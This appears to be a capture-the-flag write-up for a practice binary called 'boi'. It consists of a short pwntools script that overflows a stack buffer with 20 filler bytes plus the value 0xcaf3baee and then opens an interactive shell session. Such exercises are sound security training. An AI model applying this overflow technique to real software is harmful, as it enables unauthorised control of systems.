---
title: "boi"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./boi"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
        break *main+100
        continue
    ''')
else:
    p = process(binary_name)

payload = b'a'*20+p32(0xcaf3baee)

p.recvline() # Are you a big boiiiii??
p.sendline(payload)

p.interactive()
```